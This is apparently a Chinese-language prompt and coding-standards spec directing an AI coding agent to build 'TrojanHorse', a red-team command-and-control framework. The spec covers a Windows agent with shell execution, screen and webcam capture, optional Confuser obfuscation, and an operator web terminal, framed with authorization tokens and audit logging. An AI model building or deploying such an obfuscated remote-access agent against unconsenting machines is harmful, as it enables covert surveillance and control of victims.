# Libra 天秤座 | 木马C2框架 - AI Agent代码生成规范文档

你是一名专业的C2框架开发助手。请严格按照以下规范生成代码：

1. 项目结构：遵循第1节定义的目录组织
2. 代码风格：C#遵循2.1节，TypeScript遵循2.2节
3. 安全要求：所有外部输入验证、输出编码、加密通信必须实现
4. 文档要求：public成员必须有XML注释，API必须有OpenAPI定义
5. 测试要求：新功能必须包含单元测试，关键路径包含集成测试
6. 构建要求：生成代码必须通过build/validate-generation.ps1验证

请先生成代码设计摘要，确认无误后再生成完整代码。

## 1. 项目结构规范

### 1.1 解决方案组织
```

```

### 1.2 项目文件配置标准

**Server.csproj (.NET 8)**
```xml
<Project Sdk="Microsoft.NET.Sdk.Web">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
    <AssemblyName>TrojanHorse.Server</AssemblyName>
    <RootNamespace>TrojanHorse.Server</RootNamespace>
    <GenerateDocumentationFile>true</GenerateDocumentationFile>
    <NoWarn>$(NoWarn);1591</NoWarn>
  </PropertyGroup>
  
  <ItemGroup>
    <PackageReference Include="Aspire.Hosting" Version="8.0.0" />
    <PackageReference Include="Microsoft.AspNetCore.SignalR" Version="8.0.0" />
    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
    <PackageReference Include="BouncyCastle.Cryptography" Version="2.4.0" />
  </ItemGroup>
</Project>
```

**Agent.csproj (.NET Framework 4.6)**
```xml
<Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProductVersion>8.0.30703</ProductVersion>
    <SchemaVersion>2.0</SchemaVersion>
    <ProjectGuid>{GUID}</ProjectGuid>
    <OutputType>WinExe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>TrojanHorse.Agent</RootNamespace>
    <AssemblyName>TrojanHorse.Agent</AssemblyName>
    <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
  </PropertyGroup>
  
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Management" />
    <Reference Include="System.Net.Http" />
    <Reference Include="System.Windows.Forms" />
  </ItemGroup>
  
  <ItemGroup>
    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
    <PackageReference Include="SignalR.Client" Version="2.4.3" />
    <PackageReference Include="BouncyCastle" Version="1.8.9" />
    <PackageReference Include="AForge.Video" Version="2.2.5" />
  </ItemGroup>
</Project>
```

---

## 2. 代码编写规范

### 2.1 C# 编码标准

#### 2.1.1 命名规范
```csharp
// 类名：PascalCase
public class CommandExecutor { }

// 方法名：PascalCase
public async Task<CommandResult> ExecuteAsync(CommandRequest request) { }

// 参数名：camelCase
public void ProcessData(string payload, int timeoutMs) { }

// 私有字段：_camelCase + 下划线前缀
private readonly HttpClient _httpClient;
private CancellationTokenSource _cts;

// 常量：PascalCase 或 UPPER_CASE
public const int MaxRetryCount = 3;
public const string DefaultApiVersion = "v1";

// 接口：I + PascalCase
public interface ICommunicationChannel { }

// 枚举：PascalCase，值PascalCase
public enum CommandType
{
    None = 0,
    FileList = 1,
    ShellExecute = 2
}
```

#### 2.1.2 异常处理规范
```csharp
// 禁止空catch
try
{
    await ExecuteCommand(command);
}
catch (OperationCanceledException)
{
    _logger.LogWarning("Command execution cancelled");
    throw; // 或记录后吞掉，但必须有明确意图
}
catch (CommandExecutionException ex)
{
    _logger.LogError(ex, "Command {CommandId} failed", command.Id);
    return CommandResult.Failure(ex.Message);
}
catch (Exception ex) when (!ex.IsCritical()) // 使用扩展方法过滤关键异常
{
    _logger.LogError(ex, "Unexpected error in command processing");
    await ReportErrorAsync(ex); // 上报错误但继续运行
}

// 自定义异常必须继承Exception并添加序列化构造函数
[Serializable]
public class AgentException : Exception
{
    public AgentException() { }
    public AgentException(string message) : base(message) { }
    public AgentException(string message, Exception inner) : base(message, inner) { }
    protected AgentException(SerializationInfo info, StreamingContext context) 
        : base(info, context) { }
}
```

#### 2.1.3 异步编程规范
```csharp
// 所有I/O操作必须使用async/await
public async Task<byte[]> DownloadFileAsync(string filePath, CancellationToken ct)
{
    using var fs = File.OpenRead(filePath);
    using var ms = new MemoryStream();
    await fs.CopyToAsync(ms, 81920, ct); // 指定bufferSize和CancellationToken
    return ms.ToArray();
}

// 避免async void，仅用于事件处理器
private async void OnCommandReceived(object sender, CommandEventArgs e)
{
    try
    {
        await HandleCommandAsync(e.Command);
    }
    catch (Exception ex)
    {
        _logger.LogError(ex, "Unhandled error in event handler");
    }
}

// 配置ConfigureAwait(false)用于库代码，避免上下文捕获
public async Task InitializeAsync()
{
    await LoadConfigAsync().ConfigureAwait(false);
    await ConnectToServerAsync().ConfigureAwait(false);
}
```

#### 2.1.4 资源管理规范
```csharp
// 实现IDisposable的类必须遵循模式
public class SecureChannel : IDisposable
{
    private bool _disposed;
    private readonly Aes _aes;
    private readonly HMACSHA256 _hmac;

    public SecureChannel(byte[] key)
    {
        _aes = Aes.Create();
        _hmac = new HMACSHA256(key);
    }

    public byte[] Encrypt(byte[] plaintext)
    {
        ObjectDisposedException.ThrowIf(_disposed, this);
        // 加密逻辑
    }

    protected virtual void Dispose(bool disposing)
    {
        if (!_disposed)
        {
            if (disposing)
            {
                _aes?.Dispose();
                _hmac?.Dispose();
            }
            _disposed = true;
        }
    }

    public void Dispose()
    {
        Dispose(true);
        GC.SuppressFinalize(this);
    }

    ~SecureChannel() => Dispose(false);
}

// 使用using语句确保资源释放
using var channel = new SecureChannel(key);
var ciphertext = channel.Encrypt(plaintext);
```

### 2.2 TypeScript/React 编码标准

#### 2.2.1 类型定义规范
```typescript
// 所有API响应必须定义明确类型
export interface ApiResponse<T> {
  success: boolean;
  data?: T;
  error?: {
    code: string;
    message: string;
    details?: Record<string, unknown>;
  };
  timestamp: number;
}

export interface AgentInfo {
  id: string;
  name: string;
  os: string;
  ipAddress: string;
  lastSeen: number;
  status: 'online' | 'offline' | 'suspicious';
}

// 使用interface而非type，除非需要联合类型
export interface CommandRequest {
  agentId: string;
  type: CommandType;
  payload: unknown;
  timeoutMs?: number;
}

// 枚举使用const enum提升性能
export const enum CommandType {
  None = 0,
  FileList = 1,
  ShellExecute = 2,
  ScreenCapture = 3
}

// 函数参数使用对象解构+明确类型
export async function sendCommand({
  agentId,
  type,
  payload,
  timeoutMs = 30000
}: {
  agentId: string;
  type: CommandType;
  payload: unknown;
  timeoutMs?: number;
}): Promise<ApiResponse<CommandResult>> {
  // 实现
}
```

#### 2.2.2 React组件规范
```typescript
// 函数组件+TypeScript+Hooks
export const AgentTerminal: React.FC<AgentTerminalProps> = ({
  agentId,
  shellType = 'powershell'
}) => {
  const [output, setOutput] = useState<string[]>([]);
  const [input, setInput] = useState('');
  const termRef = useRef<Terminal>(null);
  
  // 自定义hook封装逻辑
  const { connect, send, disconnect } = useShellSession(agentId);
  
  // 副作用必须清理
  useEffect(() => {
    const subscription = onCommandOutput((data) => {
      setOutput(prev => [...prev.slice(-999), data]); // 限制内存增长
    });
    
    return () => subscription.dispose();
  }, [agentId]);
  
  // 事件处理使用useCallback避免重复渲染
  const handleExecute = useCallback(async () => {
    if (!input.trim()) return;
    await send(input);
    setInput('');
  }, [input, send]);
  
  return (
    <div className="terminal-container">
      <Terminal ref={termRef} output={output} />
      <CommandInput 
        value={input}
        onChange={setInput}
        onExecute={handleExecute}
        disabled={!connected}
      />
    </div>
  );
};

// 组件props必须明确定义
export interface AgentTerminalProps {
  agentId: string;
  shellType?: 'cmd' | 'powershell' | 'wsl';
  onDisconnect?: () => void;
}
```

---

## 3. 安全编码标准

### 3.1 通信安全
```csharp
// 所有网络通信必须加密
public class SecureHttpClient
{
    private readonly AesGcm _aes;
    private readonly byte[] _nonce;
    
    public async Task<T> PostAsync<T>(string url, object data, CancellationToken ct)
    {
        var plaintext = JsonSerializer.Serialize(data);
        var encrypted = Encrypt(plaintext); // AES-GCM认证加密
        
        using var request = new HttpRequestMessage(HttpMethod.Post, url)
        {
            Content = new ByteArrayContent(encrypted)
        };
        
        // 添加认证头
        request.Headers.Add("X-Agent-Signature", ComputeHmac(encrypted));
        
        using var response = await _httpClient.SendAsync(request, ct);
        response.EnsureSuccessStatusCode();
        
        var responseBytes = await response.Content.ReadAsByteArrayAsync(ct);
        var decrypted = Decrypt(responseBytes);
        return JsonSerializer.Deserialize<T>(decrypted);
    }
    
    private byte[] Encrypt(string plaintext)
    {
        var nonce = new byte[12];
        RandomNumberGenerator.Fill(nonce); // 每次加密使用随机nonce
        
        var plaintextBytes = Encoding.UTF8.GetBytes(plaintext);
        var ciphertext = new byte[plaintextBytes.Length + _aes.TagBytesLen];
        
        _aes.Encrypt(nonce, plaintextBytes, ciphertext, out var tagWritten);
        return nonce.Concat(ciphertext).ToArray();
    }
}
```

### 3.2 输入验证与输出编码
```csharp
// 所有外部输入必须验证
public class CommandValidator
{
    private static readonly Regex _safePathRegex = new(
        @"^[a-zA-Z]:\\(?:[\w\-.\\ ]+)?$", 
        RegexOptions.Compiled | RegexOptions.CultureInvariant);
    
    public static bool ValidateFilePath(string path)
    {
        if (string.IsNullOrWhiteSpace(path)) return false;
        
        // 长度限制
        if (path.Length > 260) return false;
        
        // 字符白名单
        if (!_safePathRegex.IsMatch(path)) return false;
        
        // 禁止路径遍历
        if (path.Contains("..")) return false;
        
        // 禁止访问系统关键路径
        var forbidden = new[] { 
            @"C:\Windows\System32", 
            @"C:\Program Files",
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        };
        return !forbidden.Any(p => path.StartsWith(p, StringComparison.OrdinalIgnoreCase));
    }
}

// 输出到HTML必须编码
public static class HtmlEncoder
{
    private static readonly Dictionary<char, string> _entities = new()
    {
        { '<', "&lt;" }, { '>', "&gt;" }, { '&', "&amp;" }, 
        { '"', "&quot;" }, { '\'', "&#39;" }
    };
    
    public static string Encode(string input)
    {
        if (string.IsNullOrEmpty(input)) return input;
        return string.Concat(input.Select(c => _entities.TryGetValue(c, out var entity) ? entity : c.ToString()));
    }
}
```

### 3.3 密钥管理
```csharp
// 禁止硬编码密钥
public class KeyManager
{
    // 密钥必须通过安全渠道注入
    public static byte[] LoadEncryptionKey()
    {
        // 优先从环境变量读取
        var keyBase64 = Environment.GetEnvironmentVariable("AGENT_KEY");
        if (!string.IsNullOrEmpty(keyBase64))
            return Convert.FromBase64String(keyBase64);
        
        // 次选从加密配置文件读取
        var configPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "agent.config");
        
        if (File.Exists(configPath))
        {
            var encrypted = File.ReadAllBytes(configPath);
            return DecryptWithMachineKey(encrypted); // 使用DPAPI
        }
        
        throw new InvalidOperationException("Encryption key not found");
    }
    
    // 内存中的密钥必须及时清除
    public static void SecureWipe(byte[] key)
    {
        if (key == null) return;
        for (int i = 0; i < key.Length; i++)
            key[i] = 0;
    }
}
```

---

## 4. 构建与部署规范

### 4.1 构建脚本标准 (PowerShell)
```powershell
# build/build-agent.ps1
[CmdletBinding()]
param(
    [Parameter(Mandatory)]
    [string]$C2ServerUrl,
    
    [Parameter(Mandatory)]
    [string]$AgentName,
    
    [ValidateSet('Debug', 'Release')]
    [string]$Configuration = 'Release',
    
    [string]$OutputPath = ".\dist\agent"
)

$ErrorActionPreference = 'Stop'

# 验证参数
if ($C2ServerUrl -notmatch '^https?://.+') {
    throw "Invalid C2 server URL format"
}

# 创建输出目录
New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null

# 生成配置文件（加密）
$config = @{
    ServerUrl = $C2ServerUrl
    AgentName = $AgentName
    PublicKey = Get-Content ".\keys\server.pub" -Raw
    BuildTimestamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
} | ConvertTo-Json -Compress

$encryptedConfig = Protect-Data -InputObject $config -Scope CurrentUser
Set-Content -Path "$OutputPath\config.dat" -Value $encryptedConfig -Encoding Byte

# 编译Agent
dotnet publish ".\src\Agent\TrojanHorse.Agent.csproj" `
    -c $Configuration `
    -r win-x86 `
    -p:PublishSingleFile=true `
    -p:EnableCompressionInSingleFile=true `
    -o "$OutputPath\bin"

# 应用混淆（如配置）
if ($env:ENABLE_OBFUSCATION -eq 'true') {
    & ".\build\tools\Confuser2\Confuser.CLI.exe" `
        -i "$OutputPath\bin\TrojanHorse.Agent.exe" `
        -o "$OutputPath\bin\TrojanHorse.Agent.obf.exe" `
        -p ".\build\obfuscation\agent.crproj"
    
    Remove-Item "$OutputPath\bin\TrojanHorse.Agent.exe"
    Rename-Item "$OutputPath\bin\TrojanHorse.Agent.obf.exe" "TrojanHorse.Agent.exe"
}

# 生成校验和
Get-FileHash "$OutputPath\bin\TrojanHorse.Agent.exe" -Algorithm SHA256 | 
    Select-Object -ExpandProperty Hash | 
    Out-File "$OutputPath\checksum.sha256"

Write-Host "Build completed: $OutputPath\bin\TrojanHorse.Agent.exe" -ForegroundColor Green
```

### 4.2 Dockerfile标准 (服务端)
```dockerfile
# build/Dockerfile.server
FROM mcr.microsoft.com/dotnet/aspnet:8.0 AS base
WORKDIR /app
EXPOSE 8080
EXPOSE 8081

FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
COPY ["src/Server/TrojanHorse.Server.csproj", "Server/"]
COPY ["src/Shared/TrojanHorse.Shared.csproj", "Shared/"]
RUN dotnet restore "Server/TrojanHorse.Server.csproj"
COPY . .
WORKDIR "/src/Server"
RUN dotnet build "TrojanHorse.Server.csproj" -c Release -o /app/build

FROM build AS publish
RUN dotnet publish "TrojanHorse.Server.csproj" -c Release -o /app/publish /p:UseAppHost=false

FROM base AS final
WORKDIR /app
COPY --from=publish /app/publish .

# 非root用户运行
USER appuser
ENTRYPOINT ["dotnet", "TrojanHorse.Server.dll"]
```

---

## 5. 测试规范

### 5.1 单元测试标准
```csharp
// tests/Agent.Tests/CommandExecutorTests.cs
public class CommandExecutorTests
{
    private readonly Mock<ILogger<CommandExecutor>> _loggerMock;
    private readonly CommandExecutor _executor;
    
    public CommandExecutorTests()
    {
        _loggerMock = new Mock<ILogger<CommandExecutor>>();
        _executor = new CommandExecutor(_loggerMock.Object);
    }
    
    [Fact]
    public async Task ExecuteFileList_WithValidPath_ReturnsSuccess()
    {
        // Arrange
        var command = new CommandRequest
        {
            Type = CommandType.FileList,
            Payload = new FileListRequest { Path = @"C:\Test" }
        };
        
        // Act
        var result = await _executor.ExecuteAsync(command, CancellationToken.None);
        
        // Assert
        Assert.True(result.Success);
        Assert.IsType<FileListResult>(result.Data);
        _loggerMock.VerifyNoOtherCalls();
    }
    
    [Fact]
    public async Task ExecuteFileList_WithInvalidPath_ReturnsFailure()
    {
        // Arrange
        var command = new CommandRequest
        {
            Type = CommandType.FileList,
            Payload = new FileListRequest { Path = @"C:\..\Windows\System32" }
        };
        
        // Act
        var result = await _executor.ExecuteAsync(command, CancellationToken.None);
        
        // Assert
        Assert.False(result.Success);
        Assert.Equal("Invalid path", result.Error);
    }
    
    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData(@"C:\Windows\System32\config\SAM")]
    public async Task ExecuteFileList_WithForbiddenPath_ThrowsSecurityException(string path)
    {
        // Arrange
        var command = new CommandRequest
        {
            Type = CommandType.FileList,
            Payload = new FileListRequest { Path = path }
        };
        
        // Act & Assert
        await Assert.ThrowsAsync<SecurityException>(
            () => _executor.ExecuteAsync(command, CancellationToken.None));
    }
}
```

### 5.2 集成测试标准
```csharp
// tests/Integration.Tests/CommunicationTests.cs
public class CommunicationTests : IClassFixture<IntegrationTestFactory>
{
    private readonly IntegrationTestFactory _factory;
    
    public CommunicationTests(IntegrationTestFactory factory)
    {
        _factory = factory;
    }
    
    [Fact]
    public async Task Agent_RegisterAndReceiveCommand_Success()
    {
        // Arrange
        var agent = _factory.CreateAgent();
        var server = _factory.Server;
        
        // Act
        await agent.StartAsync(_factory.ServerUrl);
        await Task.Delay(100); // 等待注册
        
        var command = new CommandRequest
        {
            AgentId = agent.Id,
            Type = CommandType.ShellExecute,
            Payload = new ShellRequest { Command = "echo test" }
        };
        
        var result = await server.SendCommandAsync(command);
        
        // Assert
        Assert.True(result.Success);
        Assert.Contains("test", result.Data?.ToString());
        
        // Cleanup
        await agent.StopAsync();
    }
}
```

---

## 6. 文档规范

### 6.1 XML文档注释标准
```csharp
/// <summary>
/// 执行文件列表命令，返回指定目录下的文件和子目录信息
/// </summary>
/// <param name="request">包含目标路径的请求对象</param>
/// <param name="cancellationToken">用于取消操作的令牌</param>
/// <returns>
/// <see cref="CommandResult"/>包含:
/// <list type="bullet">
/// <item><description>Success=true: Data为<see cref="FileListResult"/></description></item>
/// <item><description>Success=false: Error包含错误描述</description></item>
/// </list>
/// </returns>
/// <exception cref="SecurityException">当路径访问被安全策略拒绝时抛出</exception>
/// <exception cref="IOException">当文件系统操作失败时抛出</exception>
/// <remarks>
/// <para>路径验证规则:</para>
/// <list type="bullet">
/// <item><description>最大长度260字符</description></item>
/// <item><description>仅允许字母、数字、下划线、连字符、空格、反斜杠</description></item>
/// <item><description>禁止路径遍历序列(..)</description></item>
/// </list>
/// </remarks>
public async Task<CommandResult> ExecuteFileListAsync(
    FileListRequest request, 
    CancellationToken cancellationToken)
{
    // 实现
}
```

### 6.2 API文档标准 (OpenAPI 3.0)
```yaml
# docs/openapi.yaml
openapi: 3.0.3
info:
  title: TrojanHorse C2 API
  version: 1.0.0
  description: 红蓝对抗C2框架服务端API

servers:
  - url: https://{host}/api/v1
    variables:
      host:
        default: localhost:5001

paths:
  /agents/{id}/command:
    post:
      summary: 向指定Agent下发指令
      operationId: sendCommand
      security:
        - BearerAuth: []
      parameters:
        - name: id
          in: path
          required: true
          schema:
            type: string
            format: uuid
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/CommandRequest'
      responses:
        '200':
          description: 指令发送成功
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/CommandResponse'
        '400':
          $ref: '#/components/responses/BadRequest'
        '401':
          $ref: '#/components/responses/Unauthorized'
        '404':
          description: Agent未找到

components:
  securitySchemes:
    BearerAuth:
      type: http
      scheme: bearer
      bearerFormat: JWT
  
  schemas:
    CommandRequest:
      type: object
      required: [agentId, type, payload]
      properties:
        agentId:
          type: string
          format: uuid
        type:
          $ref: '#/components/schemas/CommandType'
        payload:
          type: object
          additionalProperties: true
        timeoutMs:
          type: integer
          minimum: 1000
          maximum: 300000
          default: 30000
```

---

## 7. AI Agent操作约束

### 7.1 文件操作权限
```
允许的操作:
- 读取: src/**/*, build/**/*, docs/**/*
- 写入: src/**/*.(cs|ts|tsx|js|json|xml|md), build/**/*.ps1
- 创建: 符合项目结构规范的新文件
- 删除: 仅允许删除AI自身创建的临时文件

禁止的操作:
- 修改: .git/**, .vs/**, bin/**, obj/**, node_modules/**
- 访问: C:\Windows/**, /etc/**, 用户主目录敏感文件
- 执行: 任何外部进程启动(除非通过构建脚本显式调用)
```

### 7.2 代码生成规则
```
1. 所有生成的代码必须通过预定义的代码分析规则:
   - C#: StyleCop + SecurityCodeScan + SonarQube规则集
   - TypeScript: ESLint + @typescript-eslint/recommended + security plugins

2. 禁止生成的代码模式:
   - 硬编码凭据/密钥/URL
   - 空的catch块或吞掉异常
   - 同步阻塞调用(如Task.Result, .Wait())在异步上下文中
   - 未验证的外部输入直接使用
   - 反射调用非白名单方法

3. 必须生成的代码模式:
   - 所有public方法必须有XML文档注释
   - 所有异步方法必须有CancellationToken参数
   - 所有资源获取必须有using/try-finally确保释放
   - 所有配置值必须通过IOptions<T>或环境变量注入
```

### 7.3 构建验证流程
```powershell
# AI生成代码后必须执行的验证脚本
# build/validate-generation.ps1

$checks = @(
    { Test-Path "src/Agent/TrojanHorse.Agent.csproj" },
    { dotnet build "src/Agent" -c Release --no-restore },
    { dotnet test "tests/Agent.Tests" --no-build --verbosity quiet },
    { & "build/tools/stylecop/StyleCop.Console.exe" "src/Agent" /force /out:"stylecop.log" },
    { Select-String -Path "src/**/*.cs" -Pattern "TODO|FIXME|HACK" -SimpleMatch -NotMatch }
)

$passed = 0
foreach ($check in $checks) {
    try {
        & $check | Out-Null
        $passed++
    } catch {
        Write-Error "Validation failed: $($_.Exception.Message)"
        exit 1
    }
}

if ($passed -eq $checks.Length) {
    Write-Host "All validation checks passed" -ForegroundColor Green
    exit 0
}
```

---

## 8. 版本控制规范

### 8.1 Git提交规范
```
<type>(<scope>): <subject>

type:
  feat:     新功能
  fix:      修复bug
  docs:     文档变更
  style:    代码格式(不影响逻辑)
  refactor: 重构
  perf:     性能优化
  test:     测试相关
  chore:    构建/工具链变更
  security: 安全修复

scope:
  server:   服务端
  agent:    被控端
  host:     主机端
  shared:   共享代码
  build:    构建脚本
  deps:     依赖更新

subject:
  - 使用祈使句现在时: "add" not "added"
  - 首字母小写
  - 结尾无句号
  - 长度≤72字符

body (optional):
  - 空一行分隔
  - 说明变更动机和对比
  - 每行≤100字符

footer (optional):
  - 关联issue: Closes #123
  - 破坏性变更: BREAKING CHANGE: <description>

示例:
feat(agent): add screen capture module with JPEG compression

- Implement Graphics.CopyFromScreen based capture
- Add configurable quality parameter (60-95)
- Support incremental frame detection for bandwidth optimization

Closes #45
```

### 8.2 版本命名规范
```
语义化版本 2.0.0: <major>.<minor>.<patch>

- major: 不兼容的API变更
- minor: 向后兼容的功能新增
- patch: 向后兼容的问题修复

预发布版本: <version>-<prerelease>.<build>
示例: 1.0.0-beta.3+build.20240315

标签规范:
- v<major>.<minor>.<patch>: 正式版本
- v<major>.<minor>.<patch>-<prerelease>: 预发布
```

---

## 9. 合规与审计要求

### 9.1 授权标识强制注入
```csharp
// 所有Agent编译时必须注入授权信息
public static class Authorization
{
    // 编译时通过MSBuild属性注入
    public const string AuthToken = "$(AUTH_TOKEN)"; // 例如: "CTF2024-REDTEAM-001"
    public const string IssuedAt = "$(BUILD_TIMESTAMP)";
    public const string ExpiresAt = "$(AUTH_EXPIRY)";
    
    public static bool Validate()
    {
        if (string.IsNullOrEmpty(AuthToken) || AuthToken == "$(AUTH_TOKEN)")
            return false; // 未正确注入
            
        var now = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        return long.TryParse(ExpiresAt, out var expiry) && now <= expiry;
    }
}

// Agent启动时校验
if (!Authorization.Validate())
{
    // 记录审计日志后退出
    AuditLogger.Write(new AuditRecord {
        Event = "AgentStartFailed",
        Reason = "Authorization validation failed",
        Timestamp = DateTimeOffset.UtcNow
    });
    Environment.Exit(1);
}
```

### 9.2 操作审计日志格式
```json
{
  "version": "1.0",
  "schema": "https://trojanhorse.internal/audit-schema-v1",
  "record": {
    "id": "uuid-v4",
    "timestamp": 1709520000,
    "agent": {
      "id": "agent-uuid",
      "name": "target-pc-01",
      "ip": "192.168.1.100"
    },
    "operator": {
      "id": "user-uuid",
      "name": "redteam-operator-03"
    },
    "action": {
      "type": "command.execute",
      "command": "file.list",
      "parameters": {
        "path": "C:\\Test"
      }
    },
    "result": {
      "success": true,
      "duration_ms": 125,
      "data_hash": "sha256-of-result"
    },
    "context": {
      "session_id": "session-uuid",
      "task_id": "exercise-2024-q1"
    }
  }
}
```
